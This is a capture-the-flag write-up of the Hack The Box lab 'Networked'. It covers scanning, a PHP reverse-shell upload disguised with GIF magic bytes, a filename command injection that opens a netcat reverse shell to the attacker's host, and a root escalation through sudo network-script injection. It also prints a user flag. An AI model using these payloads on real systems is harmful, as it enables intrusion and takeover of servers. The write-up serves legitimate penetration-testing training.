---
description: 10.10.10.146
---

# Networked

![](<../../.gitbook/assets/1 (3).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Exposed source code leads to file upload bypass and a reverse shell as "apache". Command injection via "filename" into script run every 3 minutes leads to a reverse shell as "guly".
* Root - Ability to run a script as sudo that changes network-script config files which in turn are run by root using the sourcing technique. All we need to do is run the script as sudo and when prompted type in an arbitrary string followed by a space followed by a command (/bin/bash) to get a root shell.

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.146                                                                                     1 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-10 04:59 EST
Stats: 0:09:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 25.97% done; ETC: 05:36 (0:27:25 remaining)
Stats: 0:24:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 95.32% done; ETC: 05:25 (0:01:11 remaining)
Nmap scan report for 10.10.10.146
Host is up (0.56s latency).
Not shown: 64017 filtered tcp ports (no-response), 1515 filtered tcp ports (host-unreach)
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https

Nmap done: 1 IP address (1 host up) scanned in 1517.34 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -A -p 22,80,443 10.10.10.146 -n              
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-10 05:26 EST
Nmap scan report for 10.10.10.146
Host is up (0.017s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 5.1 (94%), HP P2000 G3 NAS device (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 - 4.6 (90%), Linux 4.10 (90%), Linux 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   15.16 ms 10.10.14.1
2   17.53 ms 10.10.10.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
```

We have ports 22 and 80 open. Let's start witht he web service.

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.146/          
http://10.10.10.146/ [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.146], PHP[5.4.16], X-Powered-By[PHP/5.4.16] 

```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.146 -C all                
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.146
+ Target Hostname:    10.10.10.146
+ Target Port:        80
+ Start Time:         2021-11-10 06:23:33 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ Retrieved x-powered-by header: PHP/5.4.16
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.4.16 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /backup/: Directory indexing found.
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26469 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2021-11-10 06:32:43 (GMT-5) (550 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Nikto finds a /backup directory, which is quite interesting. Let's make a note of this and move on for now.

### Gobuster

Let's run a gobuster scan against the target. This scan includes a search for files with the "php" extention.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.146/ -q -k -x php
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)

```

We have a few items to check out now, so let's move on.​

## Website exploration

#### ​ ​Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* Comment: upload and gallery not yet linked&#x20;
* /backups: contains a tar file we can download

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Does not appear to be any Javascript

The home page contains some text, and a hidden comment in the page source. The page is loading index.php.

![](<../../.gitbook/assets/2 (2).JPG>)

The upload.php page looks interesting. If we can upload a reverse shell script, we could gain access to the box as the user running the web service.

![](<../../.gitbook/assets/4 (1).JPG>)

The photos.php page contains the image files that are uploaded, presumably using the upload.php page:

![](<../../.gitbook/assets/5 (2).JPG>)

We can test this by uploading an image file, and checking the photos page. After uploading a file, we get a message back, "file uploaded, refresh gallery", which confirms the upload was successful.

![](<../../.gitbook/assets/6 (2).JPG>)

Next, let's checkout the /backups directory. There is a file available which we can download:

![](<../../.gitbook/assets/3 (2).JPG>)

Let's extract it and see what we get:

```
└─$ tar xvf backup.tar                                                                                        2 ⨯
index.php
lib.php
photos.php
upload.php

└─$ ls -l        
total 16
-rwxrwxrwx 1 kali root 10240 Nov 10 06:25 backup.tar
-rwxrwxrwx 1 kali root   229 Nov 10 06:31 index.php
-rwxrwxrwx 1 kali root  2001 Nov 10 06:31 lib.php
-rwxrwxrwx 1 kali root  1871 Nov 10 06:31 photos.php
-rwxrwxrwx 1 kali root  1331 Nov 10 06:31 upload.php

```

There are a bunch of PHP files, which is most likely the source code for the site. Let's review them to work out what we are up against here. Below is a summary of my thoughts regarding how the file upload feature works and how we could potentially try and bypass the upload restrictions.

* The upload.php file includes the lib.php file and calls some of the functions defined in lib.php.
* First, it calls the "check\_file\_type" function in lib.php, which calls the "file\_mime\_type" function. This function then basically checks the file info for the mime type and returns back to the "check\_file\_type" function.
* Next, the function verifies that the mimetype returned matches the string "image/", and if it does, it returns "True".
* Back in upload.php, if it get's back "True", and if the file size is less than 60Kb, it moves on to check the file extension.
* If the file extension matches one of the following, '.jpg', '.png', '.gif', '.jpeg', it continues to rename the file using the uploaders IP address, and saves it into the "/var/www/html/uploads/" directory.
* Finally, the script displays the "file uploaded, refresh gallery" text on the returned web page and changes the file permissions on the uploaded file using the octal values "0644", or -rw-r--r--

To summarize, in order to bypass the restrictions, we need to ensure that the mime type of the file we upload is that of an image, the filename should end in one of the file extensions mentioned above, and the file size must be no more than 60Kb.

## Gaining Access

The plan to gain access to the target is as follows:

* Copy or create a PHP reverse shell script. I am using the following file which is included in Kali, /usr/share/webshells/php/php-reverse-shell.php. You could also download it from pentestmonkey. Modify the file to include our IP and the port for the reverse shell to be received on. I also removed most of the comments to reduce the size, although this isn't really necessary in this case.
* To bypass the file extension check, save the file as "shell.php.gif" for example.
* To bypass the mime type check, we need to add a magic byte for an allowed mime type to the beginning of the shell script. For this isntance, I added "GIF87a" to the beginning of the file.&#x20;

```
└─$ head -7 shell.php.gif
GIF87a
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.7';  // CHANGE THIS
$port = 8888;       // CHANGE THIS

└─$ file shell.php.gif    
shell.php.gif: GIF image data, version 87a, 15370 x 28735

```

Let's start a netcat listener, and upload the file. Finally, refresh the photos.php page to get the shell.

```
└─$ nc -nvlp 8888
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:51150.
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:53:37 up  7:01,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 

```

## Enumeration as "apache"

Let's get the basic system info first as follows:

```
sh-4.2$ uname -a; cat /etc/*-release; ss -lntp;
uname -a; cat /etc/*-release; ss -lntp;
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
CentOS Linux release 7.6.1810 (Core) 
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"

CentOS Linux release 7.6.1810 (Core) 
CentOS Linux release 7.6.1810 (Core) 
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      128          *:22                       *:*                  
LISTEN     0      10     127.0.0.1:25                       *:*                  
LISTEN     0      128         :::80                      :::*                  
LISTEN     0      128         :::22                      :::*                  
sh-4.2$ 

```

Upgrade the shell using python:

```
sh-4.2$ which python
which python
/usr/bin/python
sh-4.2$ which python3
which python3
which: no python3 in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin)
sh-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$ 
```

Looking in /home, we see there is a directory for "guly". We can confirm "guly" is a user on the box by checking the /etc/passwd file. Looking in the "guly" directory, we find two interesting files. Let's have a look at them.

```
bash-4.2$ cat /etc/passwd | grep -v nologin
cat /etc/passwd | grep -v nologin
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
guly:x:1000:1000:guly:/home/guly:/bin/bash

bash-4.2$ pwd
pwd
/home/guly
bash-4.2$ ls -lah
ls -lah
total 28K
drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-rw-------  1 guly guly 639 Jul  9  2019 .viminfo
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
bash-4.2$ cat check_attack.php
cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
bash-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
bash-4.2$ 
```

The first file is a PHP script that is using the same lib.php script we found earlier to call a couple of functions. The script checks each file in the '/var/www/html/uploads/' directory to make sure they are valid (IP.ext), and if not, sends an email to "guly" with the file contents, and then and removes the file.&#x20;

The crontab file confirms that the PHP script is being run every 3rd minute. Both files are owned by root and we are not able to edit them.

To test this functionality, let's transfer pspy64 to the target. Then, create a file named "test.txt" in the '/var/www/html/uploads/' directory, and run pspy to confirm the above.

{% embed url="https://github.com/DominicBreuker/pspy" %}

#### Pspy

Transfer pspy64 to the target, create the test file and then run pspy:

```
bash-4.2$ cd /var/www/html/uploads
bash-4.2$ ls -la
total 24
drwxrwxrwx. 2 root   root    134 Nov 11 10:47 .
drwxr-xr-x. 4 root   root    103 Jul  9  2019 ..
-rw-r--r--  1 apache apache 2207 Nov 11 10:01 10_10_14_7.php.gif
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_1.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_2.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_3.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_4.png
-r--r--r--. 1 root   root      2 Oct 30  2018 index.html
bash-4.2$ touch test
bash-4.2$ /tmp/pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/11/11 10:49:22 CMD: UID=0    PID=985    | 
2021/11/11 10:49:22 CMD: UID=0    PID=91     | 
2021/11/11 10:49:22 CMD: UID=0    PID=9      | 
2021/11/11 10:49:22 CMD: UID=0    PID=8      | 
...[TRUNCATED]
2021/11/11 10:49:22 CMD: UID=0    PID=11     | 
2021/11/11 10:49:22 CMD: UID=0    PID=10     | 
2021/11/11 10:49:22 CMD: UID=0    PID=1      | /usr/lib/systemd/systemd --switched-root --system --deserialize 22 
2021/11/11 10:51:01 CMD: UID=0    PID=16130  | /usr/sbin/crond -n 
2021/11/11 10:51:01 CMD: UID=0    PID=16131  | /usr/sbin/CROND -n 
2021/11/11 10:51:01 CMD: UID=1000 PID=16133  | /usr/sbin/sendmail -FCronDaemon -i -odi -oem -oi -t -f guly 
2021/11/11 10:51:01 CMD: UID=1000 PID=16132  | php /home/guly/check_attack.php 
2021/11/11 10:51:01 CMD: UID=1000 PID=16134  | php /home/guly/check_attack.php 
2021/11/11 10:51:01 CMD: UID=1000 PID=16135  | sh -c nohup /bin/rm -f /var/www/html/uploads/test > /dev/null 2>&1 &                                                                                                                 
2021/11/11 10:51:01 CMD: UID=1000 PID=16136  | /usr/sbin/sendmail -t -i -Ftest 
2021/11/11 10:51:01 CMD: UID=0    PID=16137  | sendmail: accepting connections
2021/11/11 10:51:01 CMD: UID=0    PID=16138  | sendmail: server localhost [127.0.0.1] cmd read
2021/11/11 10:51:01 CMD: UID=0    PID=16140  | 
2021/11/11 10:53:01 CMD: UID=0    PID=16236  | nice run-parts /etc/cron.weekly 
2021/11/11 10:53:01 CMD: UID=0    PID=16237  | /bin/bash /bin/run-parts /etc/cron.weekly 
2021/11/11 10:53:15 CMD: UID=0    PID=16250  | 
2021/11/11 10:54:01 CMD: UID=0    PID=16288  | /usr/sbin/crond -n 
2021/11/11 10:54:01 CMD: UID=0    PID=16289  | /usr/sbin/CROND -n 
2021/11/11 10:54:01 CMD: UID=0    PID=16290  | 
^CExiting program... (interrupt)

```

As we can see, the "check\_attack.php" script is being run by "guly", and when it finds the "test.txt" file, it removes it. The line that is vulnerable in the script is as follows:

> exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");

This command looks something like the following once the variables have been replaced:

> exec("nohup /bin/rm -f /var/www/html/uploads/test.txt > /dev/null 2>&1 &");

Instead of creating a file called "test.txt", let's create one that will give us a new reverse shell using netcat. First, start a listener, then create the file:

```
bash-4.2$ touch ';nc -e /bin/bash 10.10.14.7 8899;'
touch ';nc -e /bin/bash 10.10.14.7 8899;'
touch: cannot touch ';nc -e /bin/bash 10.10.14.7 8899;': No such file or directory
bash-4.2$ 

```

That didn't work because we cannot use the "/" character in the filename. To get around this, we can insert a variable which when read will insert the string "/bin/bash" into the command. To do this, we can use the "which" command as follows.

```
bash-4.2$ which bash
which bash
/usr/bin/bash
bash-4.2$ touch ';nc -e $(which bash) 10.10.14.7 8899;'
touch ';nc -e $(which bash) 10.10.14.7 8899;'
bash-4.2$ ls -la
ls -la
total 24
drwxrwxrwx. 2 root   root    179 Nov 11 12:55 .
drwxr-xr-x. 4 root   root    103 Jul  9  2019 ..
-rw-r--r--  1 apache apache 2207 Nov 11 10:01 10_10_14_7.php.gif
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_1.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_2.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_3.png
-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_4.png
-rw-rw-rw-  1 apache apache    0 Nov 11 12:55 ;nc -e $(which bash) 10.10.14.7 8899;
-r--r--r--. 1 root   root      2 Oct 30  2018 index.html
bash-4.2$ 

```

Back in the netcat listener, after a few minutes, we get a shell as the "guly" user, and we can grab the user flag.

```
└─$ nc -nvlp 8899          
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8899
Ncat: Listening on 0.0.0.0:8899
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:52928.
id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
python -c 'import pty; pty.spawn("/bin/bash")'
[guly@networked ~]$ pwd
pwd
/home/guly
[guly@networked ~]$ cat user.txt
cat user.txt
526cfc2305f17faaacecf212c57d71c5
[guly@networked ~]$ 

```

## Enumeration as "guly"

One of the first things to always check is whether or not the user can run commands as root. In this case, as shown below, we see that the user can run a shell script as root. Let's take a closer look at the script.

```
[guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$ ls -la /usr/local/sbin/changename.sh
ls -la /usr/local/sbin/changename.sh
-rwxr-xr-x 1 root root 422 Jul  8  2019 /usr/local/sbin/changename.sh
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
[guly@networked ~]$ 

```

Basically, the script is used to populate and start a new network interface using input from the user.  The regex matches all alphanumeric characters as well as "/", "-" and "space".&#x20;

We can have a look in the /etc/sysconfig/network-scripts/ directory for these "ifcfg" files to see what they look like. For example:

```
[guly@networked ~]$ cd /etc/sysconfig/network-scripts
cd /etc/sysconfig/network-scripts
[guly@networked network-scripts]$ ls
ls
ifcfg-ens33      ifdown-post      ifup-eth     ifup-Team
ifcfg-ens33.bak  ifdown-ppp       ifup-ippp    ifup-TeamPort
ifcfg-guly       ifdown-routes    ifup-ipv6    ifup-tunnel
ifcfg-lo         ifdown-sit       ifup-isdn    ifup-wireless
ifdown           ifdown-Team      ifup-plip    init.ipv6-global
ifdown-bnep      ifdown-TeamPort  ifup-plusb   network-functions
ifdown-eth       ifdown-tunnel    ifup-post    network-functions-ipv6
ifdown-ippp      ifup             ifup-ppp
ifdown-ipv6      ifup-aliases     ifup-routes
ifdown-isdn      ifup-bnep        ifup-sit
[guly@networked network-scripts]$ cat ifcfg-ens33.bak
cat ifcfg-ens33.bak
TYPE=Ethernet
PROXY_METHOD=none
BROWSER_ONLY=no
BOOTPROTO=dhcp
DEFROUTE=yes
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_FAILURE_FATAL=no
IPV6_ADDR_GEN_MODE=stable-privacy
NAME=ens33
DEVICE=ens33
ONBOOT=yes
[guly@networked network-scripts]$ 

```

Let's run the script and supply some dummy values:

```
[guly@networked network-scripts]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
if1
if1
interface PROXY_METHOD:
bypass
bypass
interface BROWSER_ONLY:
no
no
interface BOOTPROTO:
bootp
bootp
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
[guly@networked network-scripts]$ cat ifcfg-guly
cat ifcfg-guly
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=if1
PROXY_METHOD=bypass
BROWSER_ONLY=no
BOOTPROTO=bootp
[guly@networked network-scripts]$ 
```

Despite the error message, the new config is written to "ifcfg-guly" anyway. Because there is no "guly0" device, the config isn't initialized.

## Privilege Escalation

Let's go a quick google search to see if there is a known way to abuse this. A search for "centos network scripts root" finds the following page, with extract below:

{% embed url="https://seclists.org/fulldisclosure/2019/Apr/24" %}

> In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in the name the system tries to execute the part after the white/blank space. Which means; everything after the first blank space is executed as root.
>
> For example:
>
> /etc/sysconfig/network-scripts/ifcfg-1337
>
> NAME=Network /bin/id <= Note the blank space
>
> ONBOOT=yes&#x20;
>
> DEVICE=eth0
>
> Yes, any script in that folder is executed by root because of the sourcing technique.

Looking at the above thread, we see a response a couple of days later which confirms this is the expected behaviour, and that basically the sysadmin should not give user's access to edit these network-scripts as root because the scripts themselves run as root via the sour

Below is an explanation on the difference between executing a script and sourcing it:

{% embed url="https://www.theunixschool.com/2012/04/what-is-sourcing-file.html" %}

Let's give this a try:

```
[guly@networked network-scripts]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
network /bin/bash
network /bin/bash
interface PROXY_METHOD:
none
none
interface BROWSER_ONLY:
no
no
interface BOOTPROTO:
dhcp
dhcp
[root@networked network-scripts]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@networked network-scripts]# 

```

&#x20;​ ​ ​ ​ ​

## Resources

{% embed url="https://www.php.net/manual/en/funcref.php" %}

{% embed url="https://thecyberjedi.com/php-shell-in-a-jpeg-aka-froghopper" %}

{% embed url="https://en.wikipedia.org/wiki/List_of_file_signatures" %}

{% embed url="https://seclists.org/fulldisclosure/2019/Apr/27" %}

{% embed url="https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-sysconfig-network-scripts-centos-redhat" %}

